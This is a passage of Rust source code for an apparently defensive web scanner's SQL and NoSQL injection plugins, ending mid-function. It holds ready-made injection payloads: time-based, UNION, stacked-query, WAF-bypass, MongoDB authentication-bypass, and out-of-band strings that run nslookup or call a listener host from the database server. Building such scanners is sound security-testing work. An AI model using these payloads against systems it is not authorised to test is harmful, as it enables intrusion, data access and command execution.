/// Advanced SQL Injection Scanner
///
/// Techniques implemented:
///   1.  Error-based           — DB-specific syntax errors with verbose messages
///   2.  Boolean-blind         — compare true/false page differences (content length + hash)
///   3.  Time-based blind      — SLEEP/WAITFOR/pg_sleep/benchmark timing oracle
///   4.  UNION-based           — column-count probing + data extraction skeleton
///   5.  Stacked queries       — ; separator with secondary statement
///   6.  Out-of-band (OOB)     — DNS/HTTP callback canary payload (detect only)
///   7.  Second-order          — store payload then trigger (POST + GET round-trip)
///   8.  WAF bypass            — comment, case, encoding, whitespace variants
///   9.  NoSQL injection       — MongoDB operator injection ($where, $ne, $gt)
///  10.  DB fingerprinting     — identify MySQL / PostgreSQL / MSSQL / Oracle / SQLite
use std::time::Duration;

use async_trait::async_trait;

use crate::active::{build_injection_urls_adv, get_body, timed_get, ScanPlugin};
use crate::types::{DiscoveredUrl, Finding, Severity};

// ─────────────────────────────────────────────────────────────────────────────
// 1. Error-based (extended DB coverage)
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliErrorPlugin;

#[async_trait]
impl ScanPlugin for SqliErrorPlugin {
    fn name(&self) -> &str {
        "sqli-error"
    }
    fn description(&self) -> &str {
        "SQLi error-based — extended DB error signatures (MySQL/PG/MSSQL/Oracle/SQLite)"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        let payloads: &[(&str, &[&str])] = &[
            // Generic quote
            (
                "'",
                &[
                    "You have an error in your SQL syntax",
                    "mysql_fetch",
                    "mysql_num_rows",
                    "com.mysql.jdbc",
                ],
            ),
            // PostgreSQL
            (
                "'",
                &[
                    "pg_query()",
                    "PSQLException",
                    "unterminated quoted string",
                    "syntax error at or near",
                    "ERROR:  syntax error",
                ],
            ),
            // MSSQL
            (
                "'",
                &[
                    "Unclosed quotation mark after the character string",
                    "Microsoft OLE DB Provider for SQL Server",
                    "Incorrect syntax near",
                    "SqlException",
                    "System.Data.SqlClient",
                ],
            ),
            // Oracle
            (
                "'",
                &[
                    "ORA-00907",
                    "ORA-00933",
                    "ORA-00942",
                    "ORA-01722",
                    "oracle.jdbc",
                ],
            ),
            // SQLite
            (
                "'",
                &[
                    "SQLite3::query",
                    "sqlite3.OperationalError",
                    "no such column",
                    "unrecognized token",
                ],
            ),
            // Extended triggers (DB-specific error strings only).
            ("1/0", &["division by zero", "ORA-01476"]),
            (
                "' ORDER BY 1-- -",
                &["unknown column '1'", "invalid column name", "ORA-009"],
            ),
            (
                "' HAVING 1=1-- -",
                &["invalid column name", "ORA-009", "SQLSTATE[42"],
            ),
            ("1 EXEC xp_", &["xp_cmdshell", "xp_regread", "xp_enumdsn"]),
            (
                r#"' AND extractvalue(1,concat(0x7e,version()))-- -"#,
                &["XPATH syntax error"],
            ),
        ];

        // Control response: a DB error only counts if our payload introduced it.
        let Some(baseline) = crate::verify::Baseline::fetch(client, &target.url).await else {
            return vec![];
        };

        for (payload, signatures) in payloads {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                if let Some((_, body)) = get_body(client, &url).await {
                    let bl = body.to_lowercase();
                    for sig in *signatures {
                        if crate::verify::signature_is_new(&baseline.body_lower, &bl, sig) {
                            return vec![
                                Finding::new(
                                    "SQL Injection — Error-Based",
                                    Severity::Critical,
                                    &target.url,
                                    "The server returns a verbose database error when a malformed SQL payload is injected — and the error is absent from the baseline — confirming SQL injection.",
                                    "Use parameterized queries. Suppress database errors in production responses.",
                                    "active/sqli-error",
                                )
                                .with_parameter(&param)
                                .with_evidence(format!("Payload: `{}` → DB error signature `{}` (new vs baseline)", payload, sig))
                                .with_cwe(89)
                                .with_owasp("A03:2021 – Injection")
                                .confirmed(),
                            ];
                        }
                    }
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 2. Boolean-blind
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliBooleanPlugin;

#[async_trait]
impl ScanPlugin for SqliBooleanPlugin {
    fn name(&self) -> &str {
        "sqli-boolean"
    }
    fn description(&self) -> &str {
        "SQLi boolean-blind — compare TRUE/FALSE page differences"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // Pairs: (true_payload, false_payload)
        let pairs: &[(&str, &str)] = &[
            ("1 AND 1=1", "1 AND 1=2"),
            ("1' AND '1'='1", "1' AND '1'='2"),
            ("1 AND 1=1-- -", "1 AND 1=2-- -"),
            ("' OR 1=1-- -", "' OR 1=2-- -"),
            ("1 AND IF(1=1,1,0)", "1 AND IF(1=2,1,0)"),
            (
                "1 AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1",
                "1 AND CASE WHEN 1=2 THEN 1 ELSE 0 END=1",
            ),
            ("1 AND IIF(1=1,1,0)=1", "1 AND IIF(1=2,1,0)=1"),
            // MySQL specific
            ("1 AND (SELECT 1)=1", "1 AND (SELECT 1)=0"),
            // PG
            ("1 AND TRUE", "1 AND FALSE"),
            // MSSQL
            ("1 AND 1=CONVERT(int,'1')", "1 AND 1=CONVERT(int,'A')"),
        ];

        // Full baseline body so we can compare *structure*, not just size —
        // a page whose length wobbles between requests won't false-positive.
        let Some((_, baseline_body)) = get_body(client, &target.url).await else {
            return vec![];
        };

        // A single request-to-request comparison of the baseline against itself
        // tells us how "noisy" the page is (CSRF tokens, timestamps). If the
        // page is inherently unstable we require a wider TRUE/FALSE gap.
        let self_sim = match get_body(client, &target.url).await {
            Some((_, b2)) => crate::verify::body_similarity(&baseline_body, &b2),
            None => 1.0,
        };
        // Required separation between TRUE and FALSE, scaled by page noise.
        let min_gap = (1.0 - self_sim).max(0.05) + 0.10;

        for (true_pl, false_pl) in pairs {
            let true_variants = build_injection_urls_adv(target, true_pl);
            let false_variants = build_injection_urls_adv(target, false_pl);

            for ((param, true_url), (_, false_url)) in
                true_variants.iter().zip(false_variants.iter())
            {
                let Some((_, true_body)) = get_body(client, true_url).await else {
                    continue;
                };
                let Some((_, false_body)) = get_body(client, false_url).await else {
                    continue;
                };

                let true_sim = crate::verify::body_similarity(&baseline_body, &true_body);
                let false_sim = crate::verify::body_similarity(&baseline_body, &false_body);

                // TRUE must mirror the baseline while FALSE clearly diverges.
                let looks_injectable =
                    true_sim > 0.95 && (true_sim - false_sim) >= min_gap && false_sim < 0.95;
                if !looks_injectable {
                    continue;
                }

                // Confirmation round — repeat once to rule out transient noise.
                let confirm = match (
                    get_body(client, true_url).await,
                    get_body(client, false_url).await,
                ) {
                    (Some((_, t2)), Some((_, f2))) => {
                        let ts = crate::verify::body_similarity(&baseline_body, &t2);
                        let fs = crate::verify::body_similarity(&baseline_body, &f2);
                        ts > 0.95 && (ts - fs) >= min_gap
                    }
                    _ => false,
                };
                if !confirm {
                    continue;
                }

                return vec![
                    Finding::new(
                        "SQL Injection — Boolean-Blind",
                        Severity::Critical,
                        &target.url,
                        "The application returns baseline-equivalent content for a TRUE SQL condition and clearly different content for a FALSE one (reproduced across two rounds), indicating blind SQL injection. An attacker can enumerate the database bit-by-bit.",
                        "Use parameterized queries. The vulnerability is exploitable even without visible error messages.",
                        "active/sqli-boolean",
                    )
                    .with_parameter(param)
                    .with_evidence(format!(
                        "TRUE `{}` sim={:.2} vs FALSE `{}` sim={:.2} (baseline noise {:.2}, gap≥{:.2}), confirmed twice",
                        true_pl, true_sim, false_pl, false_sim, 1.0 - self_sim, min_gap
                    ))
                    .with_cwe(89)
                    .with_owasp("A03:2021 – Injection")
                    .confirmed(),
                ];
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 3. Time-based blind
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliTimePlugin;

const SLEEP_SECS: u64 = 5;
const TIMING_THRESHOLD_MS: u64 = 4000; // confirm if response delayed ≥4s

#[async_trait]
impl ScanPlugin for SqliTimePlugin {
    fn name(&self) -> &str {
        "sqli-time"
    }
    fn description(&self) -> &str {
        "SQLi time-based blind — SLEEP/WAITFOR/pg_sleep timing oracle"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // (payload, db_label)
        let payloads: &[(&str, &str)] = &[
            // MySQL
            (&format!("' AND SLEEP({})-- -", SLEEP_SECS), "MySQL"),
            (&format!("1 AND SLEEP({})", SLEEP_SECS), "MySQL"),
            (
                &format!("1 AND BENCHMARK({},MD5(1))", SLEEP_SECS * 200_000),
                "MySQL",
            ),
            // PostgreSQL
            (
                &format!("'; SELECT pg_sleep({})-- -", SLEEP_SECS),
                "PostgreSQL",
            ),
            (&format!("1; SELECT pg_sleep({})", SLEEP_SECS), "PostgreSQL"),
            // MSSQL
            (
                &format!("'; WAITFOR DELAY '0:0:{}'-- -", SLEEP_SECS),
                "MSSQL",
            ),
            (&format!("1; WAITFOR DELAY '0:0:{}'", SLEEP_SECS), "MSSQL"),
            (
                &format!("' OR IF(1=1,SLEEP({}),0)-- -", SLEEP_SECS),
                "MySQL IF",
            ),
            (
                "' OR CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END-- -",
                "PostgreSQL CASE",
            ),
            (
                "' OR DBMS_PIPE.RECEIVE_MESSAGE('RZ',5)=0-- -",
                "Oracle dbms_pipe",
            ),
            // Oracle (heavy CPU, no sleep — but detectable via heavy query)
            (
                "1 AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS WHERE ROWNUM<100000)",
                "Oracle",
            ),
            // SQLite (safe bounded allocation for timing detection)
            (&format!("1 AND randomblob({})", 5_000_000u64), "SQLite"),
        ];

        // We need a client with a longer timeout for sleep detection
        let long_client = reqwest::Client::builder()
            .timeout(Duration::from_secs(SLEEP_SECS + 4))
            .build()
            .unwrap_or_else(|_| client.clone());

        // Baseline latency
        let (baseline_ms, _) = timed_get(&long_client, &target.url).await;

        for (payload, db_label) in payloads {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                let (elapsed_ms, ok) = timed_get(&long_client, &url).await;
                if ok
                    && elapsed_ms >= TIMING_THRESHOLD_MS
                    && elapsed_ms >= baseline_ms + TIMING_THRESHOLD_MS
                {
                    // Confirm: the delay must reproduce, otherwise it was a
                    // transient slow response, not a controllable time oracle.
                    let (confirm_ms, confirm_ok) = timed_get(&long_client, &url).await;
                    if !(confirm_ok && confirm_ms >= baseline_ms + TIMING_THRESHOLD_MS) {
                        continue;
                    }
                    return vec![
                        Finding::new(
                            "SQL Injection — Time-Based Blind",
                            Severity::Critical,
                            &target.url,
                            format!(
                                "A {}-second delay was triggered via a {} time-delay payload, confirming blind SQL injection. The database appears to be {}.",
                                SLEEP_SECS, elapsed_ms, db_label
                            ),
                            "Use parameterized queries. Time-based injection is fully exploitable for data exfiltration via tools like sqlmap.",
                            "active/sqli-time",
                        )
                        .with_parameter(&param)
                        .with_evidence(format!(
                            "Payload: `{}` (db={}) → {}ms then {}ms on retry (baseline {}ms)",
                            payload, db_label, elapsed_ms, confirm_ms, baseline_ms
                        ))
                        .with_cwe(89)
                        .with_owasp("A03:2021 – Injection")
                        .confirmed(),
                    ];
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 4. UNION-based
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliUnionPlugin;

#[async_trait]
impl ScanPlugin for SqliUnionPlugin {
    fn name(&self) -> &str {
        "sqli-union"
    }
    fn description(&self) -> &str {
        "SQLi UNION-based — column count probing + reflection detection"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // Probe column counts 1–10; look for our canary in the response
        let canary = "rustzap9x";

        for col_count in 1usize..=10 {
            // Build UNION SELECT with NULLs except one position replaced with canary string
            for canary_pos in 0..col_count {
                let cols: Vec<String> = (0..col_count)
                    .map(|i| {
                        if i == canary_pos {
                            format!("'{}'", canary)
                        } else {
                            "NULL".to_string()
                        }
                    })
                    .collect();

                let payload = format!("' UNION SELECT {}-- -", cols.join(","));
                let variants = build_injection_urls_adv(target, &payload);

                for (param, url) in variants {
                    if let Some((_, body)) = get_body(client, &url).await {
                        if body.contains(canary) {
                            return vec![
                                Finding::new(
                                    "SQL Injection — UNION-Based",
                                    Severity::Critical,
                                    &target.url,
                                    format!(
                                        "UNION-based SQL injection confirmed. The query has {} column(s) and position {} is reflected. An attacker can extract arbitrary data from the database.",
                                        col_count, canary_pos + 1
                                    ),
                                    "Use parameterized queries. UNION injection allows full database read access including credentials.",
                                    "active/sqli-union",
                                )
                                .with_parameter(&param)
                                .with_evidence(format!(
                                    "UNION SELECT with {} cols, canary at pos {} reflected in response. Payload: `{}`",
                                    col_count, canary_pos + 1, &payload[..payload.len().min(120)]
                                ))
                                .with_cwe(89)
                                .with_owasp("A03:2021 – Injection")
                                .confirmed(),
                            ];
                        }
                    }
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 5. Stacked queries
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliStackedPlugin;

#[async_trait]
impl ScanPlugin for SqliStackedPlugin {
    fn name(&self) -> &str {
        "sqli-stacked"
    }
    fn description(&self) -> &str {
        "SQLi stacked queries — semicolon-separated secondary statement detection"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // Use a time-delay in the stacked statement as an oracle
        let payloads: &[(&str, &str)] = &[
            (";SELECT SLEEP(3)-- -", "MySQL stacked + sleep"),
            (";SELECT pg_sleep(3)-- -", "PostgreSQL stacked + sleep"),
            (";WAITFOR DELAY '0:0:3'-- -", "MSSQL stacked + waitfor"),
            // Trigger an error in the second statement (detectable without timing)
            (";SELECT 1/0-- -", "stacked + division-by-zero"),
            (";INVALID_STATEMENT-- -", "stacked + syntax error"),
        ];

        let long_client = reqwest::Client::builder()
            .timeout(Duration::from_secs(8))
            .build()
            .unwrap_or_else(|_| client.clone());

        let (baseline_ms, _) = timed_get(&long_client, &target.url).await;

        for (payload, label) in payloads {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                let (elapsed_ms, ok) = timed_get(&long_client, &url).await;
                if ok && elapsed_ms > baseline_ms + 2500 {
                    // Reproduce the delay before claiming a stacked-query oracle.
                    let (confirm_ms, confirm_ok) = timed_get(&long_client, &url).await;
                    if !(confirm_ok && confirm_ms > baseline_ms + 2500) {
                        continue;
                    }
                    return vec![
                        Finding::new(
                            "SQL Injection — Stacked Queries",
                            Severity::Critical,
                            &target.url,
                            "The database driver executes multiple semicolon-separated statements. This allows an attacker to execute arbitrary SQL, including UPDATE, DELETE, INSERT, or stored procedure calls.",
                            "Use parameterized queries. Disable multi-statement execution in your database connector.",
                            "active/sqli-stacked",
                        )
                        .with_parameter(&param)
                        .with_evidence(format!(
                            "Technique: {} — delayed {}ms then {}ms on retry (baseline {}ms). Payload: `{}`",
                            label, elapsed_ms, confirm_ms, baseline_ms, payload
                        ))
                        .with_cwe(89)
                        .with_owasp("A03:2021 – Injection")
                        .confirmed(),
                    ];
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 6. Out-of-Band (OOB) — detection only, no real callback server
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliOobPlugin;

#[async_trait]
impl ScanPlugin for SqliOobPlugin {
    fn name(&self) -> &str {
        "sqli-oob"
    }
    fn description(&self) -> &str {
        "SQLi OOB — DNS/HTTP callback payloads (requires RUSTZAP_OOB_DOMAIN listener)"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // Out-of-band injection can only be *confirmed* by an external listener
        // (Burp Collaborator / interactsh) observing the callback. Inferring a
        // hit from the HTTP response status is guesswork and produces false
        // positives, so this plugin stays inert unless the operator supplies a
        // listener domain via `RUSTZAP_OOB_DOMAIN`. When set, it dispatches the
        // payloads (so callbacks reach the listener) and reports a single
        // Tentative finding instructing the operator to check that listener.
        let canary_domain = match std::env::var("RUSTZAP_OOB_DOMAIN") {
            Ok(d) if !d.trim().is_empty() => d,
            _ => return vec![],
        };
        let canary_domain = canary_domain.as_str();

        let payloads: &[(&str, &str)] = &[
            // MySQL - LOAD_FILE via UNC (Windows)
            (
                &format!("' AND LOAD_FILE('\\\\\\\\{}\\\\foo')-- -", canary_domain),
                "MySQL UNC/LOAD_FILE",
            ),
            // MSSQL - xp_dirtree DNS lookup
            (
                &format!(
                    "'; EXEC master..xp_dirtree '\\\\{}\\foo'-- -",
                    canary_domain
                ),
                "MSSQL xp_dirtree",
            ),
            // PostgreSQL COPY TO
            (
                &format!(
                    "'; COPY (SELECT '') TO PROGRAM 'nslookup {}'-- -",
                    canary_domain
                ),
                "PostgreSQL COPY TO PROGRAM",
            ),
            // Oracle UTL_HTTP
            (
                &format!(
                    "' UNION SELECT UTL_HTTP.REQUEST('http://{}') FROM DUAL-- -",
                    canary_domain
                ),
                "Oracle UTL_HTTP",
            ),
        ];

        // Dispatch every payload so any that execute reach the listener. We do
        // NOT infer success from the HTTP response — that would be self-validation.
        let mut dispatched = Vec::new();
        for (payload, label) in payloads {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                let _ = get_body(client, &url).await;
                dispatched.push(format!("{} (param `{}`)", label, param));
            }
        }

        if dispatched.is_empty() {
            return vec![];
        }

        vec![Finding::new(
            "SQL Injection — Out-of-Band Payloads Dispatched",
            Severity::Info,
            &target.url,
            format!(
                "OOB SQLi payloads targeting listener `{}` were sent. Confirmation is only valid if a DNS/HTTP callback was observed on that listener — the HTTP response alone cannot prove this.",
                canary_domain
            ),
            "Check your interactsh/Burp Collaborator listener for callbacks from the target. A callback confirms OOB SQL injection; no callback means no evidence here.",
            "active/sqli-oob",
        )
        .with_evidence(format!(
            "Dispatched {} OOB payload variant(s) to listener {}: {}",
            dispatched.len(),
            canary_domain,
            dispatched.join("; ")
        ))
        .with_cwe(89)
        .with_owasp("A03:2021 – Injection")
        .tentative()]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 7. Second-order SQLi
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliSecondOrderPlugin;

#[async_trait]
impl ScanPlugin for SqliSecondOrderPlugin {
    fn name(&self) -> &str {
        "sqli-second-order"
    }
    fn description(&self) -> &str {
        "SQLi second-order — store payload then trigger via a different endpoint"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // Only attempt on POST endpoints that look like registration/profile update
        if target.method != "POST" {
            return vec![];
        }

        let triggers_second_order = target.url.contains("register")
            || target.url.contains("signup")
            || target.url.contains("profile")
            || target.url.contains("update")
            || target.url.contains("user");

        if !triggers_second_order {
            return vec![];
        }

        // DB-specific error strings we look for on *retrieval* — a stored value
        // that breaks a later query is what makes second-order injection real.
        let db_signatures = [
            "you have an error in your sql syntax",
            "unclosed quotation mark",
            "unterminated quoted string",
            "syntax error at or near",
            "sqlite3::query",
            "sqlstate[",
            "ora-00933",
        ];

        // A payload whose unbalanced quote surfaces only when it is later
        // interpolated into another query.
        let stored_payload = "rustzap'\"";

        // Baseline of the retrieval surface (same URL) BEFORE storing anything.
        let pre = crate::verify::Baseline::fetch(client, &target.url).await;

        for param in &target.parameters {
            let form_body: Vec<(&str, &str)> = target
                .parameters
                .iter()
                .map(|p| {
                    let val: &str = if p == param {
                        stored_payload
                    } else {
                        "rustzap_test"
                    };
                    (p.as_str(), val)
                })
                .collect();

            // Store the payload.
            let _ = client
                .post(&target.url)
                .form(&form_body)
                .timeout(Duration::from_secs(8))
                .send()
                .await;

            // Trigger: re-fetch the endpoint and look for a DB error that was
            // NOT present before we stored the payload. Only then is it real.
            let baseline_lower = pre.as_ref().map(|b| b.body_lower.as_str()).unwrap_or("");
            if let Some((_, body)) = get_body(client, &target.url).await {
                let bl = body.to_lowercase();
                for sig in &db_signatures {
                    if crate::verify::signature_is_new(baseline_lower, &bl, sig) {
                        return vec![Finding::new(
                            "Second-Order SQL Injection",
                            Severity::Critical,
                            &target.url,
                            "A SQL payload stored via this endpoint triggered a database error when the value was later retrieved, confirming second-order SQL injection.",
                            "Parameterize ALL SQL usage of stored user data, not just at initial input. Never trust previously-stored values.",
                            "active/sqli-second-order",
                        )
                        .with_parameter(param)
                        .with_evidence(format!(
                            "Stored `{}` in `{}`, then retrieval surfaced DB error `{}` (new vs pre-store baseline)",
                            stored_payload, param, sig
                        ))
                        .with_cwe(89)
                        .with_owasp("A03:2021 – Injection")
                        .confirmed()];
                    }
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 8. WAF bypass variants
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliWafBypassPlugin;

#[async_trait]
impl ScanPlugin for SqliWafBypassPlugin {
    fn name(&self) -> &str {
        "sqli-waf-bypass"
    }
    fn description(&self) -> &str {
        "SQLi WAF bypass — comment injection, case variation, encoding, whitespace tricks"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // WAF-bypass obfuscations of classic payloads. We only conclude a
        // bypass when a DB-specific error appears that was NOT in the baseline —
        // generic words like "error"/"syntax" are never used as a signal.
        let payloads: &[&str] = &[
            "'/**/OR/**/1=1-- -",
            "' # OR 1=1#",
            "'/*!50000OR*/1=1-- -",
            "/*!80027 1*/",
            "' oR '1'='1'-- -",
            "%27%20OR%201%3D1-- -",
            "'\x00 OR 1=1-- -",
            "'\tOR\t1=1-- -",
            "'\nOR\n1=1-- -",
            "1e0 UNION SELECT 1-- -",
            "' OR 0x313d31-- -",
            "' OR CHAR(49)=CHAR(49)-- -",
            "' OR CONCAT('a','b')='ab'-- -",
            "' /*!UNION*/ SELECT 1-- -",
        ];

        // DB-specific signatures shared with the error-based detector.
        let db_signatures = [
            "you have an error in your sql syntax",
            "warning: mysql_",
            "com.mysql.jdbc",
            "unclosed quotation mark after the character string",
            "microsoft ole db provider for sql server",
            "incorrect syntax near",
            "pg_query()",
            "psqlexception",
            "syntax error at or near",
            "ora-00907",
            "ora-00933",
            "sqlite3::query",
            "sqlstate[",
        ];

        let Some(baseline) = crate::verify::Baseline::fetch(client, &target.url).await else {
            return vec![];
        };

        for payload in payloads {
            let variants = build_injection_urls_adv(target, payload);
            for (param, url) in variants {
                if let Some((_, body)) = get_body(client, &url).await {
                    let bl = body.to_lowercase();
                    for sig in &db_signatures {
                        if crate::verify::signature_is_new(&baseline.body_lower, &bl, sig) {
                            return vec![
                                Finding::new(
                                    "SQL Injection — WAF Bypass",
                                    Severity::Critical,
                                    &target.url,
                                    "SQL injection was confirmed using a WAF-bypass obfuscation (comment/encoding/case/whitespace): an obfuscated payload provoked a DB error absent from the baseline.",
                                    "Fix the underlying parameterization — WAF rules alone are not sufficient protection against SQLi.",
                                    "active/sqli-waf-bypass",
                                )
                                .with_parameter(&param)
                                .with_evidence(format!(
                                    "Bypass payload: `{}` → DB signature `{}` (new vs baseline)",
                                    payload, sig
                                ))
                                .with_cwe(89)
                                .with_owasp("A03:2021 – Injection")
                                .confirmed(),
                            ];
                        }
                    }
                }
            }
        }
        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 9. NoSQL injection (MongoDB)
// ─────────────────────────────────────────────────────────────────────────────

pub struct NoSqlInjectionPlugin;

#[async_trait]
impl ScanPlugin for NoSqlInjectionPlugin {
    fn name(&self) -> &str {
        "nosql"
    }
    fn description(&self) -> &str {
        "NoSQL injection — MongoDB operator injection ($ne, $gt, $where, $regex)"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
        // For JSON body POST endpoints
        if target.method == "POST" {
            let json_payloads: &[(&str, &str)] = &[
                // Auth bypass: {"username": {"$ne": ""}, "password": {"$ne": ""}}
                (r#"{"$ne": ""}"#, "$ne operator"),
                (r#"{"$gt": ""}"#, "$gt operator"),
                (r#"{"$regex": ".*"}"#, "$regex wildcard"),
                (r#"{"$where": "1==1"}"#, "$where JS injection"),
                (r#"{"$in": ["admin", "root", "user"]}"#, "$in operator"),
            ];

            // Control request: all-benign values. An operator injection is only
            // interesting if it produces a *materially different* (successful)
            // outcome than these plausible-but-wrong credentials would.
            let control_obj: serde_json::Map<String, serde_json::Value> = target
                .parameters
                .iter()
                .map(|p| {
                    (
                        p.clone(),
                        serde_json::Value::String("rustzap_wrong_value".into()),
                    )
                })
                .collect();
            let control_body =
                serde_json::to_string(&serde_json::Value::Object(control_obj)).unwrap_or_default();
            let (control_status, control_text) = match client
                .post(&target.url)
                .header("Content-Type", "application/json")
                .body(control_body)
                .timeout(Duration::from_secs(8))
                .send()
                .await
            {
                Ok(r) => {
                    let s = r.status().as_u16();
                    (s, r.text().await.unwrap_or_default())
                }
                Err(_) => (0, String::new()),
            };

            for param in &target.parameters {
                for (op_payload, op_label) in json_payloads {
                    // Build JSON body replacing one field with the operator object
                    let mut obj = serde_json::Map::new();
                    for p in &target.parameters {
                        if p == param {
                            if let Ok(v) = serde_json::from_str::<serde_json::Value>(op_payload) {
                                obj.insert(p.clone(), v);
                            }
                        } else {
                            obj.insert(p.clone(), serde_json::Value::String("rustzap_test".into()));
                        }
                    }

                    let body_str = serde_json::to_string(&obj).unwrap_or_default();
                    let resp = client
                        .post(&target.url)
                        .header("Content-Type", "application/json")
                        .body(body_str.clone())
                        .timeout(Duration::from_secs(8))
                        .send()
                        .await;

                    if let Ok(r) = resp {
                        let status = r.status().as_u16();
                        let body = r.text().await.unwrap_or_default();
                        let bl = body.to_lowercase();

                        let auth_bypass = bl.contains("token")
                            || bl.contains("success")
                            || bl.contains("welcome")
                            || bl.contains("dashboard");

                        // Differential: the operator must SUCCEED where the benign
                        // control FAILED, and the response must differ from it.
                        let control_bl = control_text.to_lowercase();
                        let control_succeeded = control_bl.contains("token")
                            || control_bl.contains("success")
                            || control_bl.contains("welcome")
                            || control_bl.contains("dashboard");
                        let differs_from_control =
                            crate::verify::body_similarity(&control_text, &body) < 0.9
                                || status != control_status;

                        if (status == 200 || status == 302)
                            && auth_bypass
                            && !control_succeeded
                            && differs_from_control
                        {
                            return vec![
                                Finding::new(
                                    "NoSQL Injection — MongoDB Operator Injection",
                                    Severity::Critical,
                                    &target.url,
                                    format!(
                                        "MongoDB operator injection ({}) succeeded where benign credentials failed, confirming authentication bypass / unauthorized data access.",
                                        op_label
                                    ),
                                    "Validate and sanitize all user input before using in MongoDB queries. Use allowlists for expected types. Never pass raw user objects as query conditions.",
                                    "active/nosql",
                                )
                                .with_parameter(param)
                                .with_evidence(format!(
                                    "Operator {} → HTTP {} success; benign control → HTTP {} (no success). Body: `{}`",
                                    op_label, status, control_status, &body[..body.len().min(80)]
                                ))
                                .with_cwe(943)
                                .with_owasp("A03:2021 – Injection")
                                .confirmed(),
                            ];
                        }
                    }
                }
            }
        }

        // GET-based NoSQL: ?param[$ne]=x style
        let get_payloads: &[(&str, &str)] = &[
            ("[$ne]=rustzap_nonexistent_val", "MongoDB $ne in GET param"),
            ("[$gt]=", "MongoDB $gt in GET param"),
            ("[$regex]=.*", "MongoDB $regex in GET param"),
        ];

        if let Ok(parsed) = url::Url::parse(&target.url) {
            let params: Vec<(String, String)> = parsed
                .query_pairs()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect();

            // Baseline: the query as-is. A NoSQL operator should broaden the
            // result set — i.e. return a response that clearly differs from the
            // original (more rows, an object that shouldn't have matched).
            let baseline_body = get_body(client, &target.url)
                .await
                .map(|(_, b)| b)
                .unwrap_or_default();

            for (key, _) in &params {
                for (suffix, label) in get_payloads {
                    let new_url = target
                        .url
                        .replace(&format!("{}=", key), &format!("{}{}", key, suffix));

                    if let Some((status, body)) = get_body(client, &new_url).await {
                        // Confirmed only when the operator response is a 200 that
                        // meaningfully diverges from the untouched-query baseline.
                        let diverges = crate::verify::body_similarity(&baseline_body, &body) < 0.85;
                        let grew = body.len() > baseline_body.len() + 32;
                        if status == 200 && diverges && grew {
                            return vec![
                                Finding::new(
                                    "NoSQL Injection — MongoDB GET Operator",
                                    Severity::High,
                                    &target.url,
                                    format!(
                                        "A MongoDB query operator injected via GET parameter ({}) changed the result set versus the untouched query, indicating the operator reached the database.",
                                        label
                                    ),
                                    "Validate and sanitize all query parameters. Reject unexpected object types.",
                                    "active/nosql",
                                )
                                .with_parameter(key)
                                .with_evidence(format!(
                                    "Param `{}` with `{}` → HTTP 200, response diverged from baseline ({}B vs {}B)",
                                    key, suffix, body.len(), baseline_body.len()
                                ))
                                .with_cwe(943)
                                .with_owasp("A03:2021 – Injection")
                                .confirmed(),
                            ];
                        }
                    }
                }
            }
        }

        vec![]
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 10. DB fingerprinting
// ─────────────────────────────────────────────────────────────────────────────

pub struct SqliFingerprintPlugin;

#[derive(Debug, Clone)]
pub enum DbType {
    MySQL,
    PostgreSQL,
    Mssql,
    Oracle,
    SQLite,
    /// Sentinel returned by callers that cannot determine the backend.
    /// Referenced by `Display` so it must stay in the enum.
    #[allow(dead_code)]
    Unknown,
}

impl std::fmt::Display for DbType {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            DbType::MySQL => write!(f, "MySQL"),
            DbType::PostgreSQL => write!(f, "PostgreSQL"),
            DbType::Mssql => write!(f, "Microsoft SQL Server"),
            DbType::Oracle => write!(f, "Oracle"),
            DbType::SQLite => write!(f, "SQLite"),
            DbType::Unknown => write!(f, "Unknown"),
        }
    }
}

#[async_trait]
impl ScanPlugin for SqliFingerprintPlugin {
    fn name(&self) -> &str {
        "sqli-fingerprint"
    }
    fn description(&self) -> &str {
        "SQLi DB fingerprinting — identify MySQL/PostgreSQL/MSSQL/Oracle/SQLite"
    }

    async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
